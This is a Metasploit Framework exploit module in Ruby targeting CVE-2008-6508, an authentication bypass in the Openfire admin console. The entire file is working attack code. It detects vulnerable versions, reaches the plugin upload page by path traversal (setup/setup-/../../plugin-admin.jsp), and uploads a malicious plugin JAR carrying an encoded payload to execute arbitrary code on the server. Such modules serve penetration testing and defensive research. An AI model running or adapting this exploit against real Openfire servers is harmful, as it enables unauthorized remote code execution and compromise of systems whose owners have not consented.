##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'rex/zip'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	HttpFingerprint = { :pattern => [ /(Jetty)/ ] }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Openfire Admin Console Authentication Bypass',
			'Description' => %q{
					This module exploits an authentication bypass vulnerability in the administration
				console of Openfire servers. By using this vulnerability it is possible to
				upload/execute a malicious Openfire plugin on the server and execute arbitrary Java
				code. This module has been tested against Openfire 3.6.0a.

				It is possible to remove the uploaded plugin after execution, however this might turn
				the server in some kind of unstable state, making re-exploitation difficult. You might
				want to do this manually.
			},
			'Author'      =>
				[
					'Andreas Kurtz', # Vulnerability discovery
					'h0ng10'         # Metasploit module
				],
			'License'     => MSF_LICENSE,
			'References'  =>
				[
					[ 'CVE', '2008-6508' ],
					[ 'OSVDB', '49663' ],
					[ 'BID', '32189' ],
					[ 'EDB', '7075' ],
					[ 'URL', 'http://community.igniterealtime.org/thread/35874' ]
				],
			'DisclosureDate' => 'Nov 10 2008',
			'Privileged'  => true,
			'Platform'    => ['java', 'win', 'linux' ],
			'Stance'      => Msf::Exploit::Stance::Aggressive,
			'Targets'     =>
				[
					#
					# Java version
					#
					[ 'Java Universal',
						{
								'Arch' => ARCH_JAVA,
								'Platform' => 'java'
						}
					],
					#
					# Platform specific targets
					#
					[ 'Windows x86 (Native Payload)',
						{
							'Platform' => 'win',
							'Arch' => ARCH_X86,
						}
					],
					[ 'Linux x86 (Native Payload)',
						{
							'Platform' => 'linux',
							'Arch' => ARCH_X86,
						}
					]
				],
			'DefaultTarget'   => 0,

		))

		register_options(
			[
				Opt::RPORT(9090),
				OptString.new('TARGETURI', [true, 'The base path to the web application', '/']),
				OptString.new('PLUGINNAME',  [ false, 'Openfire plugin base name, (default: random)' ]),
				OptString.new('PLUGINAUTHOR',[ false, 'Openfire plugin author, (default: random)' ]),
				OptString.new('PLUGINDESC',  [ false, 'Openfire plugin description, (default: random)' ]),
				OptBool.new('REMOVE_PLUGIN', [ false, 'Try to remove the plugin after installation', false ]),
			], self.class)
	end

	def check
		base = target_uri.path
		base << '/' if base[-1, 1] != '/'

		path = "#{base}login.jsp"
		res = send_request_cgi(
			{
				'uri'    => path
			})

		if (not res) or (res.code != 200)
			print_error("Unable to make a request to: #{path}")
			return Exploit::CheckCode::Unknown
		end

		versioncheck = res.body =~ /Openfire, \D*: (\d)\.(\d).(\d)\s*<\/div>/

		if versioncheck.nil? then
			print_error("Unable to detect Openfire version")
			return Exploit::CheckCode::Unknown
		end

		print_status("Detected version: #{$1}.#{$2}.#{$3}")
		version = "#{$1}#{$2}#{$3}".to_i

		return Exploit::CheckCode::Safe if version > 360

		# Just to be sure, try to access the log page
		path = "#{base}setup/setup-/../../log.jsp"
		res = send_request_cgi(
			{
				'uri'    => path
			})

		if (not res) or (res.code != 200)
			print_error("Failed: Error requesting #{path}")
			return Exploit::CheckCode::Unknown
		end

		Exploit::CheckCode::Vulnerable
	end

	def get_plugin_jar(plugin_name)
		files = [
			[ "logo_large.gif" ],
			[ "logo_small.gif" ],
			[ "readme.html" ],
			[ "changelog.html" ],
			[ "lib", "plugin-metasploit.jar" ]
		]

		jar = Rex::Zip::Jar.new
		jar.add_files(files, File.join(Msf::Config.install_root, "data", "exploits", "CVE-2008-6508"))

		plugin_author = datastore['PLUGINAUTHOR'] || rand_text_alphanumeric(8+rand(8))
		plugin_desc   = datastore['PLUGINDESC']   || rand_text_alphanumeric(8+rand(8))

		plugin_xml = File.open(File.join(Msf::Config.install_root, "data", "exploits", "CVE-2008-6508", "plugin.xml"), "rb") {|fd| fd.read() }
		plugin_xml.gsub!(/PLUGINNAME/, plugin_name)
		plugin_xml.gsub!(/PLUGINDESCRIPTION/, plugin_desc)
		plugin_xml.gsub!(/PLUGINAUTHOR/, plugin_author)

		jar.add_file("plugin.xml", plugin_xml)

		jar
	end

	def exploit
		base = target_uri.path
		base << '/' if base[-1, 1] != '/'

		plugin_name = datastore['PLUGINNAME'] || rand_text_alphanumeric(8+rand(8))
		plugin = get_plugin_jar(plugin_name)

		arch = target.arch
		plat = [Msf::Module::PlatformList.new(target['Platform']).platforms[0]]

		if (p = exploit_regenerate_payload(plat, arch)) == nil
			print_error("Failed to regenerate payload")
			return
		end

		plugin.add_file("lib/#{rand_text_alphanumeric(8)}.jar", payload.encoded_jar.pack)
		plugin.build_manifest

		# Upload the plugin to the server
		print_status("Uploading plugin #{plugin_name} to the server")
		boundary = rand_text_alphanumeric(6)

		data = "--#{boundary}\r\nContent-Disposition: form-data; name=\"uploadfile\"; "
		data << "filename=\"#{plugin_name}.jar\"\r\nContent-Type: application/java-archive\r\n\r\n"
		data << plugin.pack
		data << "\r\n--#{boundary}--"

		res = send_request_cgi({
			'uri'     => "#{base}setup/setup-/../../plugin-admin.jsp?uploadplugin",
			'method'  => 'POST',
			'data'    => data,
			'headers' =>
				{
					'Content-Type'   => 'multipart/form-data; boundary=' + boundary,
					'Content-Length' => data.length,
					'Cookie' => "JSESSIONID=#{rand_text_numeric(13)}",
				}
		})


		print_error("Warning: got no response from the upload, continuing...") if !res

		# Delete the uploaded JAR file
		if datastore['REMOVE_PLUGIN']
			print_status("Deleting plugin #{plugin_name} from the server")
			res = send_request_cgi({
				'uri'     => "#{base}setup/setup-/../../plugin-admin.jsp?deleteplugin=#{plugin_name.downcase}",
				'headers' =>
					{
						'Cookie' => "JSESSIONID=#{rand_text_numeric(13)}",
					}
			})
			if not res
				print_error("Error deleting the plugin #{plugin_name}. You might want to do this manually.")
			end
		end
	end
end
